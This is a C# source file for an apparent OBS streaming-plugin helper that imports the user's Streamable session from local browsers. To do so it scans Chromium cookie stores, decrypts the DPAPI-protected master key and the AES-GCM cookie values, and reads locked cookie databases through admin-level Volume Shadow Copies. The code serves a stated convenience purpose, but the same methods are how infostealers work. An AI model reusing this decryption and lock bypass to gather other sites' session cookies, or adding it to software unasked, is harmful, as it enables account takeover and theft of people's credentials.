using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Security;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;

namespace ReplayKitHelper
{
    internal sealed class CookieSource
    {
        public string Name;
        public string Cookies;
        public string LocalState;
        public string Root;
    }

    internal sealed class BrowserCookie
    {
        public string Host;
        public string Name;
        public string Value;
        public string Path;
        public long Expires;
        public bool Secure;
        public bool HttpOnly;
    }

    // cef cookie import (google sign-in path). strategy: open streamable.com/login as a cef window inside obs, let the user sign in, then dig the streamable.com session cookies out of obss own chromium cookie database. chromium 80+ encrypts cookie values with aes-gcm; the master key is dpapi-encrypted inside the Local State json next to the cookies file. ported from obs_replaykit helper modules/11_browser_cookies.ps1.
    internal static class BrowserCookies
    {
        private static List<CookieSource> _browserSourcesCache;
        private static readonly object BrowserSourcesLock = new object();

        private sealed class CookieMissEntry
        {
            public string Signature;
            public string Reason;
            public long At;
        }
        private static readonly Dictionary<string, CookieMissEntry> CookieSourceMissCache = new Dictionary<string, CookieMissEntry>();
        private static readonly object MissCacheLock = new object();
        private static readonly HashSet<string> UnreadableSources = new HashSet<string>();
        private static readonly object UnreadableSourcesLock = new object();

        // are we admin -- vss shadow-copy creation needs it. also used by Program.cs at startup to log admin state.
        public static bool TestIsAdmin()
        {
            try
            {
                using (var id = WindowsIdentity.GetCurrent())
                {
                    var p = new WindowsPrincipal(id);
                    return p.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch (Exception ex) when (ex is SecurityException || ex is UnauthorizedAccessException) { return false; }
        }

        // every chromium-based cookie store on this machine we know how to read. the users defualt browser (where theyre already signed in to google) is typically chrome or edge -- those come first. obss own cef is last (its only useful as a fallback when the user signs in inside the obs-hosted popup instead of their defualt browser). cached for the process lifetime -- install paths dont change while obs is running, and the enumeration costs ~50ms each call.
        public static List<CookieSource> GetBrowserCookieSources()
        {
            lock (BrowserSourcesLock)
            {
                if (_browserSourcesCache != null) return _browserSourcesCache;

                string appData = Environment.GetEnvironmentVariable("APPDATA");
                string localApp = Environment.GetEnvironmentVariable("LOCALAPPDATA");
                if (string.IsNullOrEmpty(localApp)) return new List<CookieSource>();

                // obs cef first: its the only source where the sign-in flow lands cookies (continue with google opens the streamable login as a child cef window), and its the only readable source on chrome 127+ machines (chromes own db is v20 abe-locked). scanning it first means the success path returns without touching the others.
                var candidates = new List<(string Name, string Root)>();
                if (!string.IsNullOrEmpty(appData))
                    candidates.Add(("OBS CEF", Path.Combine(appData, "obs-studio", "plugin_config", "obs-browser")));
                candidates.Add(("Edge", Path.Combine(localApp, "Microsoft", "Edge", "User Data")));
                candidates.Add(("Chrome", Path.Combine(localApp, "Google", "Chrome", "User Data")));
                candidates.Add(("Brave", Path.Combine(localApp, "BraveSoftware", "Brave-Browser", "User Data")));
                candidates.Add(("Vivaldi", Path.Combine(localApp, "Vivaldi", "User Data")));
                candidates.Add(("Opera", Path.Combine(localApp, "Opera Software", "Opera Stable")));

                // cookies file moved between chromium revisions and lives one per profile. every profile directory (defualt, profile 1, profile 2, ...) is enumerated so users who dont use defualt still get matched.
                var cookieSubPaths = new[] { Path.Combine("Network", "Cookies"), "Cookies" };
                var outList = new List<CookieSource>();

                foreach (var c in candidates)
                {
                    if (!Directory.Exists(c.Root)) continue;
                    // Local State holds the dpapi-wrapped aes-gcm master key used to decrypt v10/v11 cookie blobs. full chromium / edge / brave name it exactly Local State. embedded cef (obs browser plugin) renames the same json shape to LocalPrefs.json becuase that variant runs cef without a full chromium prefservice. the os_crypt.encrypted_key field is identical in both, so the same decrypt path works on both.
                    string local = Path.Combine(c.Root, "Local State");
                    bool hasLocal = File.Exists(local);
                    if (!hasLocal)
                    {
                        string localCef = Path.Combine(c.Root, "LocalPrefs.json");
                        if (File.Exists(localCef)) { local = localCef; hasLocal = true; }
                    }

                    var profiles = new List<string>();
                    if (Directory.Exists(Path.Combine(c.Root, "Default"))) profiles.Add("Default");
                    try
                    {
                        foreach (var dir in Directory.GetDirectories(c.Root))
                        {
                            string name = Path.GetFileName(dir);
                            if (Regex.IsMatch(name, @"^Profile \d+$")) profiles.Add(name);
                        }
                    }
                    catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException) { }
                    // embedded cef apps (obs) and some chromium variants (notably opera stable) keep cookies right in the root with no profile dir.
                    profiles.Add("");

                    foreach (var p in profiles)
                    {
                        string profileRoot = !string.IsNullOrEmpty(p) ? Path.Combine(c.Root, p) : c.Root;
                        foreach (var sub in cookieSubPaths)
                        {
                            string cookies = Path.Combine(profileRoot, sub);
                            if (File.Exists(cookies))
                            {
                                string label = (!string.IsNullOrEmpty(p) && p != "Default") ? c.Name + " [" + p + "]" : c.Name;
                                outList.Add(new CookieSource { Name = label, Cookies = cookies, LocalState = hasLocal ? local : null, Root = c.Root });
                                break;
                            }
                        }
                    }
                }
                Log.Write("Get-BrowserCookieSources found " + outList.Count + " source(s): " + string.Join(", ", outList.Select(s => s.Name)));
                _browserSourcesCache = outList;
                return outList;
            }
        }

        private static string GetCookieSourceSignature(CookieSource source)
        {
            var parts = new List<string>();
            var paths = new List<string>();
            if (!string.IsNullOrEmpty(source.Cookies)) paths.Add(source.Cookies);
            foreach (var ext in new[] { "-wal", "-shm", "-journal" })
            {
                if (!string.IsNullOrEmpty(source.Cookies)) paths.Add(source.Cookies + ext);
            }
            foreach (var p in paths)
            {
                try
                {
                    var fi = new FileInfo(p);
                    if (fi.Exists) parts.Add(string.Format("{0}:{1}:{2}", p, fi.Length, fi.LastWriteTimeUtc.Ticks));
                    else parts.Add(p + ":missing");
                }
                catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException || ex is SecurityException)
                {
                    parts.Add(p + ":error");
                }
            }
            return string.Join("|", parts);
        }

        private static CookieMissEntry GetCachedCookieMiss(CookieSource source, string signature)
        {
            string key = source.Name;
            if (string.IsNullOrEmpty(key) || string.IsNullOrEmpty(signature)) return null;
            lock (MissCacheLock)
            {
                if (CookieSourceMissCache.TryGetValue(key, out var entry) && entry.Signature == signature) return entry;
            }
            return null;
        }

        private static void SetCachedCookieMiss(CookieSource source, string signature, string reason)
        {
            string key = source.Name;
            if (string.IsNullOrEmpty(key) || string.IsNullOrEmpty(signature)) return;
            lock (MissCacheLock)
            {
                CookieSourceMissCache[key] = new CookieMissEntry { Signature = signature, Reason = reason, At = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() };
            }
        }

        private static void ClearCachedCookieMiss(CookieSource source)
        {
            string key = source.Name;
            if (string.IsNullOrEmpty(key)) return;
            lock (MissCacheLock) { CookieSourceMissCache.Remove(key); }
        }

        // decrypt the aes-gcm master key out of Local State. format: base64(dpapi("dpapi" + 32-byte aes key)). strip the literal "dpapi" prefix (5 bytes) before handing to ProtectedData.Unprotect.
        private static byte[] GetChromiumMasterKey(string localStatePath)
        {
            if (!File.Exists(localStatePath)) return null;
            try
            {
                string text = File.ReadAllText(localStatePath);
                if (text.Length > 0 && text[0] == '\uFEFF') text = text.Substring(1);
                var obj = JObject.Parse(text);
                string b64 = obj["os_crypt"]?["encrypted_key"]?.Value<string>();
                if (string.IsNullOrEmpty(b64)) return null;
                byte[] enc = Convert.FromBase64String(b64);
                if (enc.Length < 6) return null;
                byte[] blob = new byte[enc.Length - 5];
                Array.Copy(enc, 5, blob, 0, blob.Length);
                return ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Log.Write("Get-ChromiumMasterKey: " + ex.Message);
                return null;
            }
        }

        // decrypt a single cookies encrypted_value blob. returns the plaintext value, or null on failure / wrong format.
        private static string DecryptCookieValue(byte[] masterKey, byte[] encryptedValue)
        {
            if (masterKey == null || encryptedValue == null || encryptedValue.Length < 32) return null;
            string prefix = Encoding.ASCII.GetString(encryptedValue, 0, 3);
            if (prefix != "v10" && prefix != "v11") return null;
            const int nonceLen = 12, tagLen = 16;
            byte[] nonce = new byte[nonceLen];
            Array.Copy(encryptedValue, 3, nonce, 0, nonceLen);
            int tagStart = encryptedValue.Length - tagLen;
            int cipherLen = tagStart - (3 + nonceLen);
            if (cipherLen < 0) return null;
            byte[] cipher = new byte[cipherLen];
            Array.Copy(encryptedValue, 3 + nonceLen, cipher, 0, cipherLen);
            byte[] tag = new byte[tagLen];
            Array.Copy(encryptedValue, tagStart, tag, 0, tagLen);
            try
            {
                byte[] plain = NativeCrypto.Decrypt(masterKey, nonce, cipher, tag);
                return Encoding.UTF8.GetString(plain);
            }
            catch (Exception ex)
            {
                Log.Write("Decrypt-CookieValue: " + ex.Message);
                return null;
            }
        }

        // copy a possibly-locked file using FileShare.ReadWrite|Delete so we can read past chromiums exclusive lock on the active profiles cookies db. throws if the source cant even be opened that way -- chrome 105+ opens with FILE_SHARE_NONE so this always throws for the active chrome profile; vss picks up the slack below.
        private static void CopyLockedFile(string src, string dst)
        {
            const FileShare share = FileShare.ReadWrite | FileShare.Delete;
            using (var inS = File.Open(src, FileMode.Open, FileAccess.Read, share))
            using (var outS = File.Create(dst))
            {
                inS.CopyTo(outS);
            }
        }

        private sealed class VssFileEntry
        {
            public string Src;
            public string Dst;
            public bool Required;
        }

        private static bool CreateShadowCopy(string volume, out ManagementObject shadowObj, out string deviceObject)
        {
            shadowObj = null;
            deviceObject = null;
            try
            {
                using (var shadowClass = new ManagementClass("root\\cimv2", "Win32_ShadowCopy", null))
                using (var inParams = shadowClass.GetMethodParameters("Create"))
                {
                    inParams["Volume"] = volume;
                    inParams["Context"] = "ClientAccessible";
                    using (var outParams = shadowClass.InvokeMethod("Create", inParams, null))
                    {
                        uint rv = (uint)outParams["ReturnValue"];
                        if (rv != 0)
                        {
                            Log.Write("VSS: Win32_ShadowCopy.Create returned " + rv + " on " + volume);
                            return false;
                        }
                        string shadowId = (string)outParams["ShadowID"];
                        using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ShadowCopy WHERE ID='" + shadowId + "'"))
                        {
                            foreach (ManagementObject mo in searcher.Get()) { shadowObj = mo; break; }
                        }
                        if (shadowObj == null)
                        {
                            Log.Write("VSS: shadow " + shadowId + " created but lookup returned null");
                            return false;
                        }
                        deviceObject = (string)shadowObj["DeviceObject"];
                        return true;
                    }
                }
            }
            catch (ManagementException ex)
            {
                Log.Write("VSS: failed: " + ex.Message);
                return false;
            }
        }

        private static bool MakeJunction(string junctionPath, string targetPath)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c mklink /j " + ProcessArgs.Quote(junctionPath) + " " + ProcessArgs.Quote(targetPath),
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };
            using (var proc = Process.Start(psi))
            {
                string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                proc.WaitForExit();
                if (proc.ExitCode != 0)
                {
                    Log.Write("VSS: mklink /j failed: " + output);
                    return false;
                }
                return true;
            }
        }

        private static void RemoveJunction(string junctionPath)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c rmdir " + ProcessArgs.Quote(junctionPath),
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };
            using (var proc = Process.Start(psi))
            {
                proc.StandardOutput.ReadToEnd();
                proc.StandardError.ReadToEnd();
                proc.WaitForExit();
            }
        }

        // volume shadow copy-based file copy for a group of files (a cookies db plus its -wal/-shm/-journal sidecars) sharing one shadow copy. bypasses any exclusive file lock becuase the read comes from a kernel-level point-in-time snapshot of the volume rather than the live file. requires admin; returns false otherwise.
        private static bool CopyWithVssFiles(List<VssFileEntry> files)
        {
            if (!TestIsAdmin())
            {
                Log.Write("VSS: not admin -- skipping shadow-copy fallback for grouped cookie copy");
                return false;
            }
            if (files == null || files.Count == 0) return false;

            string volume = Path.GetPathRoot(files[0].Src);
            if (string.IsNullOrEmpty(volume))
            {
                Log.Write("VSS: no volume root resolvable from " + files[0].Src);
                return false;
            }

            ManagementObject shadowObj = null;
            string junction = null;
            try
            {
                if (!CreateShadowCopy(volume, out shadowObj, out string deviceObject)) return false;

                void CopyFromBase(string basePath)
                {
                    foreach (var f in files)
                    {
                        string relPath = f.Src.Substring(volume.Length);
                        string shadowSrc = basePath + "\\" + relPath;
                        try { File.Copy(shadowSrc, f.Dst, true); }
                        catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException)
                        {
                            if (f.Required) throw;
                            Log.Write("VSS: optional sidecar copy skipped for " + f.Src + " : " + ex.Message);
                        }
                    }
                }

                try
                {
                    CopyFromBase(deviceObject);
                    return true;
                }
                catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException)
                {
                    Log.Write("VSS: grouped direct copy failed: " + ex.Message + "; falling back to junction");
                    junction = Path.Combine(Constants.SCRATCH_DIR, "vss_" + Guid.NewGuid().ToString("N"));
                    if (!MakeJunction(junction, deviceObject)) return false;
                    CopyFromBase(junction);
                    return true;
                }
            }
            catch (ManagementException ex)
            {
                Log.Write("VSS: grouped copy failed: " + ex.Message);
                return false;
            }
            finally
            {
                if (junction != null && Directory.Exists(junction))
                {
                    try { RemoveJunction(junction); } catch (Exception ex) when (ex is IOException || ex is System.ComponentModel.Win32Exception) { }
                }
                try { shadowObj?.Delete(); } catch (ManagementException) { }
                shadowObj?.Dispose();
            }
        }

        // read streamable.com cookies from one chromium-based browser cookie store. expires_utc in chromium is microseconds since 1601-01-01 utc ("webkit time"). the active chrome profile holds an exclusive os lock on its cookies file, so the db (and its wal/shm sidecars, if any) is copied into a temp directory first and the copy is read instead; the copy is deleted after closing.
        public static List<BrowserCookie> ReadStreamableCookiesFromSource(CookieSource source, out string errorOut)
        {
            errorOut = null;
            // per-session blacklist: once a source is confirmed to use an unreadable encryption envelope (chrome 127+s v20 app-bound encryption, intentionally undecryptable by anyone outside chromes elevated com service), skip it on subsequent /import-session polls. login polling fires every couple seconds while the user signs in, and a vss shadow-copy + sqlite scan of a 50k-row chrome db costs 2-3 seconds per source.
            lock (UnreadableSourcesLock)
            {
                if (UnreadableSources.Contains(source.Name)) return new List<BrowserCookie>();
            }

            // master key is only required if encrypted_value blobs use aes-gcm. sources without Local State (embedded cef builds with os_crypt disabled, e.g. obs) store cookies plaintext in the value column -- no master key needed there.
            byte[] masterKey = null;
            if (!string.IsNullOrEmpty(source.LocalState))
            {
                masterKey = GetChromiumMasterKey(source.LocalState);
                if (masterKey == null)
                    Log.Write(source.Name + ": Local State present but master key decrypt failed; will only see plaintext cookies.");
            }

            string tempDir = Path.Combine(Constants.SCRATCH_DIR, "strmbl_helper_" + Guid.NewGuid().ToString("N"));
            string tempCookies = Path.Combine(tempDir, "Cookies");
            bool copiedViaVss = false;
            try
            {
                Directory.CreateDirectory(tempDir);
                try
                {
                    CopyLockedFile(source.Cookies, tempCookies);
                }
                catch (Exception copyEx) when (copyEx is IOException || copyEx is UnauthorizedAccessException)
                {
                    // direct copy refused -- the holding process opened the file with no shared access (chrome 105+, obs cef). fall back to a volume shadow copy so the read comes from a kernel snapshot instead of the live file. needs admin; the helper inherits admin from obs when obs is launched as administrator.
                    Log.Write(source.Name + ": direct copy refused (" + copyEx.Message + "); trying VSS");
                    var vssFiles = new List<VssFileEntry> { new VssFileEntry { Src = source.Cookies, Dst = tempCookies, Required = true } };
                    foreach (var ext in new[] { "-wal", "-shm", "-journal" })
                    {
                        string sideSrc = source.Cookies + ext;
                        if (File.Exists(sideSrc)) vssFiles.Add(new VssFileEntry { Src = sideSrc, Dst = tempCookies + ext, Required = false });
                    }
                    if (!CopyWithVssFiles(vssFiles)) throw new IOException("Both direct copy and VSS failed for " + source.Cookies);
                    copiedViaVss = true;
                    Log.Write(source.Name + ": VSS copy succeeded.");
                }
                // carry the wal/shm sidecars too so cookie writes chromium hasnt yet checkpointed back to the main file are visible. use whichever method worked for the main file.
                if (!copiedViaVss)
                {
                    foreach (var ext in new[] { "-wal", "-shm", "-journal" })
                    {
                        string sideSrc = source.Cookies + ext;
                        if (File.Exists(sideSrc))
                        {
                            try { CopyLockedFile(sideSrc, tempCookies + ext); }
                            catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException) { }
                        }
                    }
                }
            }
            catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException)
            {
                string msg = ex.Message;
                Log.Write(source.Name + ": could not copy cookies db: " + msg);
                // surface "wed have needed vss, but were not admin" upward so FindWorkingStreamableSession can return an actionable error ("relaunch obs as admin") rather than the generic "no session found" that hides this root cause.
                errorOut = (msg.Contains("Both direct copy and VSS failed") && !TestIsAdmin()) ? "locked file, not admin" : msg;
                try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); } catch (Exception ex2) when (ex2 is IOException || ex2 is UnauthorizedAccessException) { }
                return new List<BrowserCookie>();
            }
            // mark this source as successfully read so per-source diagnostics can tell apart "file copy failed" from "file copy fine but no streamable cookies present".
            errorOut = "";

            IntPtr db;
            try
            {
                db = NativeSqlite.OpenReadOnly(tempCookies);
            }
            catch (InvalidOperationException ex)
            {
                Log.Write(source.Name + ": sqlite3_open_v2 failed on copy at " + tempCookies + ": " + ex.Message);
                try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); } catch (Exception ex2) when (ex2 is IOException || ex2 is UnauthorizedAccessException) { }
                return new List<BrowserCookie>();
            }

            var cookies = new List<BrowserCookie>();
            try
            {
                // diagnostic pass: how many cookies are in this db at all, and what domains look streamable-ish -- helps tell apart "db is fine, just no streamable cookies" from "a stale or empty db got copied". best-effort only, never fatal.
                try
                {
                    IntPtr diagStmt = NativeSqlite.Prepare(db, "SELECT COUNT(*) FROM cookies");
                    if (NativeSqlite.Step(diagStmt) == NativeSqlite.SQLITE_ROW)
                        Log.Write(source.Name + ": cookie DB has " + NativeSqlite.ColumnInt64(diagStmt, 0) + " row(s) total.");
                    NativeSqlite.Finalize(diagStmt);
                }
                catch (InvalidOperationException) { }

                try
                {
                    IntPtr diagStmt2 = NativeSqlite.Prepare(db, "SELECT host_key, COUNT(*) FROM cookies WHERE host_key LIKE '%stream%' GROUP BY host_key");
                    var hits = new List<string>();
                    while (NativeSqlite.Step(diagStmt2) == NativeSqlite.SQLITE_ROW)
                        hits.Add(NativeSqlite.ColumnText(diagStmt2, 0) + "=" + NativeSqlite.ColumnInt64(diagStmt2, 1));
                    NativeSqlite.Finalize(diagStmt2);
                    Log.Write(hits.Count > 0
                        ? source.Name + ": stream-ish hosts in cookie DB: " + string.Join(", ", hits)
                        : source.Name + ": no host_keys containing 'stream' in this DB.");
                }
                catch (InvalidOperationException) { }

                // pull both columns: encrypted_value (aes-gcm, master-keyed) for normal chromium, and value (plaintext) for embedded cef builds with os_crypt disabled.
                string sql = "SELECT host_key, name, encrypted_value, value, path, expires_utc, is_secure, is_httponly FROM cookies WHERE host_key LIKE '%streamable.com'";
                IntPtr stmt;
                try { stmt = NativeSqlite.Prepare(db, sql); }
                catch (InvalidOperationException ex)
                {
                    Log.Write(source.Name + ": sqlite3_prepare_v2 failed: " + ex.Message);
                    return cookies;
                }

                // diagnostic tallies so its clear exactly why a row was dropped -- without this all skips look identical from outside ("no streamable.com cookies in this store") and decrypt-failed cant be told apart from no-master-key or unknown-prefix.
                int rowsTotal = 0, skipNoMaster = 0, skipBadPrefix = 0, skipDecrypt = 0, skipEmpty = 0, kept = 0;
                var prefixSamples = new Dictionary<string, int>();
                string firstBlobBytes = null;

                try
                {
                    while (NativeSqlite.Step(stmt) == NativeSqlite.SQLITE_ROW)
                    {
                        string hostKey = NativeSqlite.ColumnText(stmt, 0);
                        string name = NativeSqlite.ColumnText(stmt, 1);
                        byte[] encVal = NativeSqlite.ColumnBlob(stmt, 2);
                        string plainVal = NativeSqlite.ColumnText(stmt, 3);
                        string path = NativeSqlite.ColumnText(stmt, 4);
                        long expiresWk = NativeSqlite.ColumnInt64(stmt, 5);
                        long secure = NativeSqlite.ColumnInt64(stmt, 6);
                        long httpOnly = NativeSqlite.ColumnInt64(stmt, 7);
                        rowsTotal++;

                        // sniff the prefix even if its not recognized -- tells us if chrome moved to v20 app-bound encryption.
                        string prefix = "";
                        if (encVal != null && encVal.Length >= 3)
                        {
                            prefix = Encoding.ASCII.GetString(encVal, 0, 3);
                            prefixSamples[prefix] = (prefixSamples.TryGetValue(prefix, out int cnt) ? cnt : 0) + 1;
                            if (firstBlobBytes == null && encVal.Length >= 8)
                            {
                                var hexSb = new StringBuilder();
                                for (int i = 0; i < 8; i++) { if (i > 0) hexSb.Append(' '); hexSb.Append(encVal[i].ToString("X2")); }
                                firstBlobBytes = hexSb.ToString();
                            }
                        }

                        string val = null;
                        if (prefix == "v10" || prefix == "v11")
                        {
                            if (masterKey == null) skipNoMaster++;
                            else
                            {
                                val = DecryptCookieValue(masterKey, encVal);
                                if (val == null) skipDecrypt++;
                            }
                        }
                        else if (encVal != null && encVal.Length > 0)
                        {
                            // unknown encryption envelope (e.g. v20 abe).
                            skipBadPrefix++;
                        }

                        if (val == null && !string.IsNullOrEmpty(plainVal)) val = plainVal;
                        if (val == null)
                        {
                            if (prefix == "" || prefix == "v10" || prefix == "v11") skipEmpty++;
                            continue;
                        }

                        kept++;
                        cookies.Add(new BrowserCookie
                        {
                            Host = hostKey,
                            Name = name,
                            Value = val,
                            Path = !string.IsNullOrEmpty(path) ? path : "/",
                            // webkit microseconds-since-1601 -> unix seconds.
                            Expires = expiresWk > 0 ? (expiresWk / 1000000) - 11644473600 : 0,
                            Secure = secure != 0,
                            HttpOnly = httpOnly != 0,
                        });
                    }
                }
                finally
                {
                    NativeSqlite.Finalize(stmt);
                }

                // per-source summary, always logged even when 0 cookies kept.
                string prefixStr = prefixSamples.Count > 0 ? string.Join(", ", prefixSamples.Select(kv => kv.Key + "=" + kv.Value)) : "(no encrypted blobs)";
                string masterStr = masterKey != null ? "yes (" + masterKey.Length + "B)" : "no";
                Log.Write(string.Format("{0}: scanned={1} kept={2} skip-no-master={3} skip-prefix={4} skip-decrypt={5} skip-empty={6} master-key={7} prefixes=[{8}] firstBlob=[{9}]",
                    source.Name, rowsTotal, kept, skipNoMaster, skipBadPrefix, skipDecrypt, skipEmpty, masterStr, prefixStr, firstBlobBytes));

                // blacklist this source for the rest of the session if every streamable.com row used an envelope we cant decrypt. chrome 127+ writes v20 abe-wrapped blobs that no third-party process can unwrap, so polling again would only burn time. rowsTotal > 0 is required (otherwise the source may just not have any cookies yet) and every row must have failed via the unknown-prefix path.
                if (rowsTotal > 0 && kept == 0 && skipBadPrefix == rowsTotal)
                {
                    lock (UnreadableSourcesLock) { UnreadableSources.Add(source.Name); }
                    Log.Write(source.Name + ": blacklisting for this session (unreadable encryption envelope).");
                }
            }
            finally
            {
                NativeSqlite.Close(db);
                try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); } catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException) { }
            }
            return cookies;
        }

        public sealed class StreamableSessionResult
        {
            public bool Ok;
            public string Error;
            public string SourceName;
            public List<BrowserCookie> Cookies;
            public string Jar;
            public JObject User;
        }

        // try every browser cookie store on the box, return the first one whose streamable.com cookies actualy validate via /me. "first source that has cookies" isnt enough -- a stale logged-out cookie set is still a cookie set, and a working session shouldnt get clobbered by one that 401s on /me.
        public static StreamableSessionResult FindWorkingStreamableSession(bool obsOnly = false)
        {
            var sources = GetBrowserCookieSources();
            if (sources == null || sources.Count == 0)
                return new StreamableSessionResult { Ok = false, Error = "No supported browser cookie stores found on this machine." };

            if (obsOnly)
            {
                sources = sources.Where(s => s.Name == "OBS CEF").ToList();
                if (sources.Count == 0)
                    return new StreamableSessionResult { Ok = false, Error = "OBS browser cookie store was not found." };
            }

            // tracks whether every source failed for the same reason (locked file + no admin to vss around it). when thats the case the actual root cause should reach the ui instead of a generic "no session found" line.
            bool allLockedNoAdmin = true;
            int sourcesAttempted = 0;
            foreach (var s in sources)
            {
                sourcesAttempted++;
                string sourceSignature = GetCookieSourceSignature(s);
                var cachedMiss = GetCachedCookieMiss(s, sourceSignature);
                if (cachedMiss != null)
                {
                    string reason = cachedMiss.Reason ?? "";
                    Log.Write(s.Name + ": skipping unchanged cookie source after previous miss (" + reason + ").");
                    if (!reason.Contains("not admin")) allLockedNoAdmin = false;
                    continue;
                }
                var cookies = ReadStreamableCookiesFromSource(s, out string readError);
                if (cookies == null || cookies.Count == 0)
                {
                    Log.Write(s.Name + ": no streamable.com cookies in this store.");
                    string missReason = !string.IsNullOrEmpty(readError) ? readError : "no streamable cookies";
                    SetCachedCookieMiss(s, sourceSignature, missReason);
                    if (!(!string.IsNullOrEmpty(readError) && readError.Contains("not admin"))) allLockedNoAdmin = false;
                    continue;
                }
                allLockedNoAdmin = false;
                Log.Write(s.Name + ": found " + cookies.Count + " streamable.com cookie(s)");
                string jar = FormatCurlCookieJar(cookies);
                var live = AuthCore.InvokeStreamableMe(jar);
                if (live != null)
                {
                    // reject "anonymous session" responses. streamable hands out a session cookie to anyone who visits /login, and /me returns 200 with plan defaults for those sessions too -- but with no id / user_name / email fields. that is structurally diffrent from a real signed-in user and must not be treated as authenticated.
                    bool hasIdentity = live["id"] != null || live["user_name"] != null || live["email"] != null;
                    if (!hasIdentity)
                    {
                        Log.Write(s.Name + ": /me returned an anonymous session (no id/user_name/email). Ignoring.");
                        SetCachedCookieMiss(s, sourceSignature, "anonymous streamable session");
                    }
                    else
                    {
                        Log.Write("Found valid Streamable session in " + s.Name + ".");
                        ClearCachedCookieMiss(s);
                        return new StreamableSessionResult { Ok = true, SourceName = s.Name, Cookies = cookies, Jar = jar, User = live };
                    }
                }
                else
                {
                    Log.Write(s.Name + ": /me rejected the cookies (session expired? wrong domain match?)");
                }
            }

            if (allLockedNoAdmin && sourcesAttempted > 0)
            {
                return new StreamableSessionResult
                {
                    Ok = false,
                    Error = "OBS is not running as administrator, so the helper cannot read Chrome's or OBS's locked cookies files. " +
                            "Close OBS and relaunch it with \"Run as administrator\", then try Continue with Google again."
                };
            }
            return new StreamableSessionResult { Ok = false, Error = "No signed-in streamable.com session found. Sign in in your browser and try again." };
        }

        // netscape-format cookie jar (the format curl reads via -b). format per line, tab-separated: domain flag path secure expires name value -- flag is TRUE/FALSE for "include subdomains", determined by whether host_key starts with a dot.
        private static string FormatCurlCookieJar(List<BrowserCookie> cookies)
        {
            var sb = new StringBuilder();
            sb.Append("# Netscape HTTP Cookie File\r\n");
            sb.Append("# generated by ReplayKitHelper\r\n");
            foreach (var c in cookies)
            {
                string subdomain = c.Host.StartsWith(".") ? "TRUE" : "FALSE";
                string secure = c.Secure ? "TRUE" : "FALSE";
                string line = c.Host + "\t" + subdomain + "\t" + c.Path + "\t" + secure + "\t" + c.Expires + "\t" + c.Name + "\t" + c.Value;
                if (c.HttpOnly) line = "#HttpOnly_" + line;
                sb.Append(line).Append("\r\n");
            }
            return sb.ToString();
        }
    }
}
